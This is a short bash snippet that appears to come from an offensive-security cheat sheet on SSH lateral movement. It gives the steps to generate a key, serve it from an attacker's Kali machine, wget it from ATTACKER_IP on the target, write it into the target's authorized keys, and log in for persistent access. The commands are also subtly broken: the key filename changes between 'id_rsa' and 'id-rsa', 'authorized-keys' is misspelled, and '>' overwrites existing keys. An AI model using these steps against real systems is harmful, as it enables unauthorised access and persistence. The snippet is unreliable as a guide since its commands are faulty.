```bash
ssh-keygen -t rsa -b 4096 -f id_rsa  
chmod 600 id-rsa  
# send it to target
# run on your kali:
python3 -m http.server  
# run on target
wget http://ATTACKER_IP:8000/id_rsa.pub  
# copy to authorized hosts
cat id_rsa.pub > ~/.ssh/authorized-keys
# run on your kali to login:
ssh -i id-rsa TARGET_USER@TARGET_IP
```
https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/